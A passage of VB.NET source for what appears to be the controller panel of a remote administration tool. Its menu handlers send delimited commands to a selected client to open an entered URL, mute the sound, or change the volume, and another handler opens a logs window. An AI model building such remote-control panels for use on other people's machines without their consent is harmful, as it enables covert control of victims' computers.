            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
        End If
    End Sub

    Private Async Sub OpenURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenURLToolStripMenuItem.Click
        ' "|LNK|"'
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim A As String = InputBox("Set a link : ")

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|LNK|" & "|SP2|" & A & "|ENDING|"


            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))


        End If
    End Sub

    Private Async Sub MuteSoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MuteSoundToolStripMenuItem.Click
        '"|MSOUND|"

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|MSOUND|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub SoundUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SoundUpToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|+SOUND|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub SoundDownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SoundDownToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|-SOUND|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Public T As Thread
    Public LG As New LogsForm
    Private Sub ShowLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowLogsToolStripMenuItem.Click
        If LG Is Nothing Then

            LG = New LogsForm
            T = New Thread(Sub() Application.Run(LG))
            T.Start()

        Else
            LG.Show()

        End If

    End Sub




#End Region
End Class
